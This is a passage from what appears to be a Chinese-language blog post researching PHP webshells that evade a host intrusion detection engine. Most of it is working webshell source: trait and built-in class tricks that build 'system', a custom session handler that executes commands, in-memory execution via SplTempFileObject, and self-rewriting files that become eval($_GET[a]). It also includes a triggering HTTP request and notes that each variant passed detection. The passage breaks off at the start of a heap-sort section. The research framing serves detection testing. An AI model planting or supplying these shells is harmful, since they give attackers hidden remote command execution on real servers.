+<p><code>$s[1]-&gt;a=$_GET[&#39;a&#39;];</code>  这里他将 get请求获取的值 赋值给数组s的第二个元素，也就是刚刚的r:2 </p>
+<p>又进行引用，指向了s[0]，这样也具有一定的迷惑性迷惑waf</p>
+<p><code>$c=$s[0]-&gt;a;</code>  下面有将 s[0] 赋值给a ，然后赋值给c</p>
+<p>最后的命令执行 参数也就是$c</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804113122051.png" alt="image-20250804113122051"></p>
+<p>刚刚这里 我们还需要注意 他最后命令执行的函数也就是通过</p>
+<p>substr(get_declared_classes()[72],4,6)</p>
+<p>这里我们需要修改为我们环境的 70</p>
+<p>刚好截取出来的是system，然后进行拼接执行函数</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804113334426.png" alt="image-20250804113334426"></p>
+<p>成功执行</p>
+<h3 id="0x07-trait"><a href="#0x07-trait" class="headerlink" title="0x07 trait"></a>0x07 trait</h3><p>在对前两种模式Fuzz的同时，我发现了一个新的思路，这个思路虽然同样部分依赖于 系统环境变量，但是由于执行函数和传参都进行了变形，可以有效阻断污点追踪技术。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">trait system&#123; </span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line">$a= new OverflowException($_GET[&#x27;a&#x27;]); </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$c = &quot;123&quot;; </span><br><span class="line">$arr= getmygid(); </span><br><span class="line">$i=0; </span><br><span class="line">for($i;$i&lt;$arr;$i++)&#123; </span><br><span class="line">    $i++; </span><br><span class="line">    if($i&lt;33 || $i&gt;=34)&#123; </span><br><span class="line">        continue; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    $c=$a-&gt;getMessage(); </span><br><span class="line">    get_declared_traits()[0]($c); </span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>他先用trait 定义了一个类，trait这个是php中为了完善定义类的方式新增了可复用类</p>
+<p>如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">trait Hello &#123;</span><br><span class="line">    public function sayHello() &#123;</span><br><span class="line">        echo &#x27;Hello &#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trait World &#123;</span><br><span class="line">    public function sayWorld() &#123;</span><br><span class="line">        echo &#x27;World&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyHelloWorld &#123;</span><br><span class="line">    use Hello, World;</span><br><span class="line">    public function sayExclamationMark() &#123;</span><br><span class="line">        echo &#x27;!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = new MyHelloWorld();</span><br><span class="line">$o-&gt;sayHello();</span><br><span class="line">$o-&gt;sayWorld();</span><br><span class="line">$o-&gt;sayExclamationMark();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后他 new了一个对象 通过OverflowException这个默认的类创建</p>
+<p>抛出异常的一个类，</p>
+<p>我们可以去官方文档看一下他有哪些属性和方法</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804120056516.png" alt="image-20250804120056516"></p>
+<p>这里可以看到我们传入了 一个get传参，第一个参数就是message，进行了赋值</p>
+<p>且后面也调用了getmessage() ，进行赋值给$c</p>
+<p>然后这里他还将 $arr 通过getmygid() 获得文件的所属组的id，进行赋值给$arr，</p>
+<p>然后去进行了if判断，在33 的时候正好 能继续执行下面的代码，而且我们可以看一下</p>
+<p>&#x2F;etc&#x2F;passwd，下面的 www-data 的组id是多少</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804120451533.png" alt="image-20250804120451533"></p>
+<p>可以看到这个是33，也就是可以成功执行下面的代码</p>
+<p>最后执行 get_declared_traits()[0]</p>
+<p>这个方法</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804120611473.png" alt="image-20250804120611473"></p>
+<p>可以看到 他的返回值是 已经定义的 所有 traits 的名称的数组，这里我们只定义了一个</p>
+<p>所以就可以把system 取出来</p>
+<p>最后也是拼接执行的代码</p>
+<p>测试</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804120735694.png" alt="image-20250804120735694"></p>
+<p>成功</p>
+<p>然后这里这个异常的类有很多，都可以进行替换，一般的抛出异常肯定是有抛出异常信息这个的方法和属性的，</p>
+<p>为什么能绕过呢？</p>
+<p>这里我如此初始化：$a&#x3D; new JsonException($_GET[‘a’]); 于是，分别从危险函数和 用户传参两个路径来狙击动态跟踪，发生了新的绕过。除了JsonException以外，我发现  引擎对内置接口的getMessage 普遍不敏感，这样的内置类大致（未严格测试，其中可能 会有些类不支持getMessage方法）如下： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Error </span><br><span class="line">    ArithmeticError </span><br><span class="line">      DivisionByZeroError </span><br><span class="line">    AssertionError </span><br><span class="line">    ParseError </span><br><span class="line">    TypeError </span><br><span class="line">      ArgumentCountError </span><br><span class="line">  Exception </span><br><span class="line">    ClosedGeneratorException </span><br><span class="line">    DOMException </span><br><span class="line">    ErrorException </span><br><span class="line">    IntlException </span><br><span class="line">    LogicException </span><br><span class="line">      BadFunctionCallException </span><br><span class="line">        BadMethodCallException </span><br><span class="line">      DomainException </span><br><span class="line">      InvalidArgumentException </span><br><span class="line">      LengthException </span><br><span class="line">      OutOfRangeException </span><br><span class="line">    PharException </span><br><span class="line">    ReflectionException </span><br><span class="line">    RuntimeException </span><br><span class="line">      OutOfBoundsException </span><br><span class="line">      OverflowException </span><br><span class="line">      PDOException </span><br><span class="line">      RangeException </span><br><span class="line">      UnderflowException </span><br><span class="line">      UnexpectedValueException </span><br><span class="line">    SodiumException</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x08-SESSION"><a href="#0x08-SESSION" class="headerlink" title="0x08 SESSION"></a>0x08 SESSION</h3><p>如果动态引擎去检查，他应该没有SESSION，至少是在第一次的时候。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line">$b = &quot;111&quot;; </span><br><span class="line">$c = &quot;222&quot;; </span><br><span class="line">session_start(); </span><br><span class="line">$_SESSION[&#x27;a&#x27;]=&quot;#&quot;; </span><br><span class="line"> </span><br><span class="line">$a = array( &quot;one&quot;=&gt;$c,&quot;two&quot;=&gt;&amp;$c ); </span><br><span class="line">$url = &quot;http://a/usr/&quot;.$_SESSION[&#x27;a&#x27;].&quot;?a=1&quot;; </span><br><span class="line">$d =parse_url($url); </span><br><span class="line"> </span><br><span class="line">if($d[&#x27;query&#x27;])&#123; </span><br><span class="line"> </span><br><span class="line">    $c=&quot;echo 111;&quot;; </span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $c=$_FILES[&#x27;useraccount&#x27;][&#x27;name&#x27;]; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">var_dump($a[&quot;two&quot;]); </span><br><span class="line">eval($a[&quot;two&quot;]); </span><br><span class="line"> </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p> 模式基本上是与之前相同的，不同之处在于引入了SESSION变量来干扰URL解析，不 知为何，这样一次就通过了检测。其实更加高级的方法应该是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line">$b = &quot;111&quot;; </span><br><span class="line">$c = &quot;222&quot;; </span><br><span class="line">session_start(); </span><br><span class="line"> </span><br><span class="line">$a = array( &quot;one&quot;=&gt;$c,&quot;two&quot;=&gt;&amp;$c ); </span><br><span class="line">$url = &quot;http://a/usr/&quot;.$_SESSION[&#x27;a&#x27;].&quot;?a=1&quot;; </span><br><span class="line">$d =parse_url($url); </span><br><span class="line"> </span><br><span class="line">if($d[&#x27;query&#x27;])&#123; </span><br><span class="line"> </span><br><span class="line">    $c=&quot;echo 111;&quot;; </span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $c=$_FILES[&#x27;useraccount&#x27;][&#x27;name&#x27;]; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">var_dump($a[&quot;two&quot;]); </span><br><span class="line">eval($a[&quot;two&quot;]); </span><br><span class="line"> </span><br><span class="line">$_SESSION[&#x27;a&#x27;]=&quot;#&quot;; </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>由于规则需要一次性执行成功，因此需要在文件末尾加入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ($_SESSION[&#x27;a&#x27;]!=&quot;#&quot;)&#123; </span><br><span class="line">    $_SESSION[&#x27;a&#x27;]=&quot;#&quot;; </span><br><span class="line">    print(1); </span><br><span class="line">    include(get_included_files()[0]); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>触发该WebShell的HTTP请求为： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /x.php HTTP/1.1 </span><br><span class="line">Host: x </span><br><span class="line">Content-Type: multipart/form-data;boundary=a; </span><br><span class="line">Content-Length: 101 </span><br><span class="line">Cookie: PHPSESSID=bkukterqhtt79mrso0p6ogpqtm; </span><br><span class="line"> --a </span><br><span class="line">Content-Disposition: form-data; name=&quot;useraccount&quot;; filename=&quot;phpinfo();&quot; </span><br><span class="line"> </span><br><span class="line">phpinfo(); </span><br><span class="line"> --a--</span><br></pre></td></tr></table></figure>
+
+<p>这个方法其实也跟前面的 0x05是差不多的，利用的是 waf和服务器的差异性，这里我们就不做过多的分析了</p>
+<h3 id="0x09-SESSION扩展"><a href="#0x09-SESSION扩展" class="headerlink" title="0x09 SESSION扩展"></a>0x09 SESSION扩展</h3><p>利用SessionHandlerInterface 扩展的接口可以神不知鬼不觉地执行特定函数，直 接看代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">class MySessionHandler implements SessionHandlerInterface </span><br><span class="line">&#123; </span><br><span class="line">    // implement interfaces here </span><br><span class="line">    public function close() </span><br><span class="line">    &#123; </span><br><span class="line">        // TODO: Implement close() method. </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    public function destroy($id) </span><br><span class="line">    &#123; </span><br><span class="line">        // TODO: Implement destroy() method. </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    public function gc($max_lifetime) </span><br><span class="line">    &#123; </span><br><span class="line">        // TODO: Implement gc() method. </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    public function open($path, $name) </span><br><span class="line">    &#123; </span><br><span class="line">        $path($name); </span><br><span class="line"> </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    public function read($id) </span><br><span class="line">    &#123; </span><br><span class="line">        // TODO: Implement read() method. </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    public function write($id, $data) </span><br><span class="line">    &#123; </span><br><span class="line">        // TODO: Implement write() method. </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">$handler = new MySessionHandler(); </span><br><span class="line">session_set_save_handler($handler, true); </span><br><span class="line">session_name($_GET[&#x27;a&#x27;]); </span><br><span class="line">session_save_path(&#x27;system&#x27;); </span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以看到，他自建了一个SessionHandlerInterface，并重写了里面的方法进行了覆盖，也就是说</p>
+<p>我们后面开启session_start() 的时候，会调用我们自己写的 方法，而不是系统自带的</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804121645979.png" alt="image-20250804121645979"></p>
+<p>这是他系统自带的属性和方法，因为我们进行覆盖，可以不写下面具体的方法，只需要有这个方法名，他才不会报错，这里感觉跟之前做的dll劫持导出表有相似之处</p>
+<p>这里我们是在open下做的代码执行，其实也可以在其他地方，但是他需要接收两个用户可控的地方</p>
+<p>目前感觉只有 open 和write 可以</p>
+<p>因为我们知道 sessionid是用户可控的，data 就是我们要写入的数据 ，可以测试一下</p>
+<p>感觉不太像，这个data 他是序列化后的结果 ，无法 构造出我们想要的</p>
+<p>所以还是只有open可以实现，因为path，和name 我们可以直接传入</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804122727273.png" alt="image-20250804122727273"></p>
+<p>没问题成功执行了</p>
+<h3 id="0x0A-内存"><a href="#0x0A-内存" class="headerlink" title="0x0A 内存"></a>0x0A 内存</h3><p>之前有考虑过写入文件后include，但是被规则禁止了，即便是include session文件也 不行，于是，想到了内存。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a = new SplTempFileObject(1000000);</span><br><span class="line">$a-&gt;fwrite( $_GET[&#x27;a&#x27;]); </span><br><span class="line">$a-&gt;rewind(); </span><br><span class="line">substr(get_declared_classes()[70],4,6)($a-&gt;fgets()); </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里他用SplTempFileObject 这个类创建了a这个对象，我们知道 php中，创建对象的时候</p>
+<p>会自动调用__construct这个魔术方法执行</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804132219798.png" alt="image-20250804132219798"></p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804132235224.png" alt="image-20250804132235224"></p>
+<p>那就明白了，他这个给maxMemory 设置了大概1M 的大小，然后通过fwrite进行写入文件 给$a</p>
+<p>然后又将指针移动向文件的开头，substr(get_declared_classes()[70],4,6) 构造system，之前讲个这个构造</p>
+<p>，然后在通过$a-&gt;fgets()，读命令执行</p>
+<p>测试</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804133847219.png" alt="image-20250804133847219"></p>
+<p>这里为什么要设置1M ，目的是为了不让他在我们执行命令的过程中生成临时文件，绕过waf</p>
+<p>只要是2M一下都行</p>
+<h3 id="0x0B-修改自身"><a href="#0x0B-修改自身" class="headerlink" title="0x0B 修改自身"></a>0x0B 修改自身</h3><p>修改自身的洞都被认定为同一种绕过手法了，而且已经有人先提交，因此被忽略了，但 是仍然写出来供大家参考。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$s=&quot;Declaring file object\n&quot;; </span><br><span class="line">$d=$_SERVER[&#x27;DOCUMENT_ROOT&#x27;].$_SERVER[&#x27;DOCUMENT_URI&#x27;]; </span><br><span class="line">$file = new SplFileObject($d,&#x27;w&#x27;); </span><br><span class="line"> </span><br><span class="line">$file-&gt;fwrite(&quot;&lt;?php&quot;.&quot; eva&quot;.$s[3]); </span><br><span class="line">$file-&gt;fwrite(&quot;(\$_&quot;.&quot;GET&quot;.&quot;[a]);?&gt;&quot;); </span><br><span class="line"> </span><br><span class="line">include(get_included_files()[0]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>先定义了一个$s &#x3D; “Declaring file object\n”</p>
+<p>然后通过$_SERVER[‘DOCUMENT_ROOT’].$_SERVER[‘DOCUMENT_URI’]拼接了一个字符串，我们打印看一下是什么，</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804134545321.png" alt="image-20250804134545321"></p>
+<p>我们可以看到 $_SERVER 中是一个数组，然后 DOCUMENT_ROOT 是服务器网站的根目录，DOCUMENT_URI是文件的路径，拼接起来就是 &#x2F;var&#x2F;www&#x2F;html&#x2F;baypass&#x2F;demo11.php，就拿到了我们php的绝对路径</p>
+<p>我还发现 ，SCRIPT_FILENAME 这个也可以直接拿到文件的绝对路径，用拼接的方式也可能是为了迷惑waf</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804134843626.png" alt="image-20250804134843626"></p>
+<p>这几个其实都能用来利，</p>
+<p>然后他 又通过SplFileObject这个类new了一个对象为$file 参数为 自己文件的绝对路径，mode是w</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804135151433.png" alt="image-20250804135151433"></p>
+<p>我们可以看到 他正好第一个参数，第二个参数就是 文件名和mode，其他的都有默认值</p>
+<p><code>$file-&gt;fwrite(&quot;&lt;?php&quot;.&quot; eval(\$s[3]);&quot;);</code> </p>
+<p><code>$file-&gt;fwrite(&quot;(\$_&quot;.&quot;GET&quot;.&quot;[a]);?&gt;&quot;);</code> </p>
+<p>然后他通过fwrite进行写文件</p>
+<p>这里其实我有一个疑问，他这里为什么是追加不是覆盖呢？</p>
+<p>查找资料发现</p>
+<p>因为我们 new对象的时候mode用的是w</p>
+<p><code>&#39;w&#39;</code>模式的特性是：</p>
+<ul>
+<li>打开文件时会<strong>清空原有内容</strong>（首次写入前文件已被截断）</li>
+<li>但写入过程中，文件指针会<strong>自动向后移动</strong>，新的写入操作会从当前指针位置继续，形成连续追加</li>
+</ul>
+<p><strong>fwrite () 的指针移动机制</strong><br>每次调用<code>fwrite()</code>后，文件指针会自动移动到<strong>写入内容的末尾</strong>。因此：</p>
+<ul>
+<li>第一次<code>fwrite()</code>写入<code>&quot;&lt;?php&quot;.&quot; eva&quot;.$s[3]&quot;</code></li>
+<li>指针移动到这段内容的末尾</li>
+<li>第二次<code>fwrite()</code>从当前指针位置继续写入<code>&quot;(\$_GET[a]);?&gt;&quot;</code></li>
+<li>最终两个字符串会被拼接在一起，形成完整内容：<?php eval($_GET[a]);?></li>
+</ul>
+<p>这里要避免$ 符被正确识别，所以要用\进行转义</p>
+<p>也就是说我们写完后的指针在末尾!!!</p>
+<p>最后用  get_included_files 进行获取 文件的路径</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804135949567.png" alt="image-20250804135949567"></p>
+<p>这里我们也打印一下看看他是什么</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804140040813.png" alt="image-20250804140040813"></p>
+<p>发现这里他只有一个元素也就是我们的文件名</p>
+<p>测试执行一下</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804140337782.png" alt="image-20250804140337782"></p>
+<p>发现自身的文件成功被修改为 我们想要的payload</p>
+<p>直接的文件读写函数被禁止了，因此需要通过SplFileObject来写，由于需要一次性执行 和稳定触发，写入之后需要自己include自己。这种WebShell很有趣，就像是披着羊皮的 狼，上传的时候看起来平平无奇，被执行一次以后就完全变了模样。  沿用这个思路，还有一个点是可以写文件的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">print &quot;Declaring file object\n&quot;; </span><br><span class="line">$f=__FILE__; </span><br><span class="line">$file = new SplFileObject($f,&#x27;w&#x27;); </span><br><span class="line"> </span><br><span class="line">$a=array(&quot;&lt;?php /*&quot;, &quot;*/eva&quot;,&quot;(\$_GET[a]);&quot;); </span><br><span class="line">$file-&gt;fputcsv($a,&#x27;l&#x27;); </span><br><span class="line"> </span><br><span class="line">$file=null; </span><br><span class="line"> </span><br><span class="line">include(get_included_files()[0]); </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个代码主要的方法就是写函数不一样 fputcsv</p>
+<p>查查官方文档</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804163635726.png" alt="image-20250804163635726"></p>
+<p><code>putcsv($a,&#39;l&#39;);</code>  这里我们传入$a是我们的payload ，也就是我们传入的这个数组，然后用l 来进行分割，也就是将逗号替换为了l，但是这里有两个逗号，正常替换是&lt;?php l eval ($_GET[a]);这里会多一个l所以我们用</p>
+<p>&#x2F;* *&#x2F; 进行注释</p>
+<p>测试</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804164041643.png" alt="image-20250804164041643"></p>
+<p>成功变为了我们想要的，只是多了一个双引号，但是并不影响我们执行</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804164125480.png" alt="image-20250804164125480"></p>
+<p>不同之处在于，这里使用的是fputcsv，此时，需要将写入文件以后所产生的分隔符进 行注释，因此在构造payload时需要花点心思。   更进一步，使用这个方法加载缓存也是可以的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">$s=&quot;Declaring file objecT\n&quot;; </span><br><span class="line"> </span><br><span class="line">$file = new SplTempFileObject(); </span><br><span class="line"> </span><br><span class="line">$file-&gt;fputcsv(explode(&#x27;m&#x27;,&quot;evam(\$_GET[m]);&quot;),&#x27;l&#x27;); </span><br><span class="line"> </span><br><span class="line">$file-&gt;rewind(); </span><br><span class="line">eval($file-&gt;fgets()); </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>他先创建了一个对象 用SplTempFileObject这个类</p>
+<p>然后用这个类里面的方法来写payload</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804164409628.png" alt="image-20250804164409628"></p>
+<p>用法跟前面的差不多，先用 explode m 来分割 evam($_GET[m]); ，</p>
+<p>分割后变成了 eva ($_GET[   ]);</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804164818967.png" alt="image-20250804164818967"></p>
+<p>这样我们能就有一个3个元素的数组，然后他又用fputcsv   l，来进行分割(代替逗号)</p>
+<p>变为了： eval($_GET[l])；所以我们传参的值是l</p>
+<p>然后他重置了一下指针到开头，然后在用eval来执行文件内容</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165113938.png" alt="image-20250804165113938"></p>
+<p>没问题</p>
+<h3 id="0x0C-堆排序"><a href="#0x0C-堆排序" class="headerlink" title="0x0C 堆排序"></a>0x0C 堆排序</h3><p>动态查杀引擎根据模拟执行的情况来进行判断，那么我们能否将好的坏的掺在一起，这 就像一个箱子里面有个5球，按号码从大到小摆放好，按顺序取，想办法让引擎取到正常的 球，而我们执行的时候通过控制参数取到能变为WebShell的球。我先放入3个正常的球0、 7、8和一个恶意的球’system’，还有一个球我通过GET参数控制，暂且称之为x。  当x取大于8以上的数字时，会有一个最大堆（绿色为按最大堆顶点依次导出的顺序）：</p>
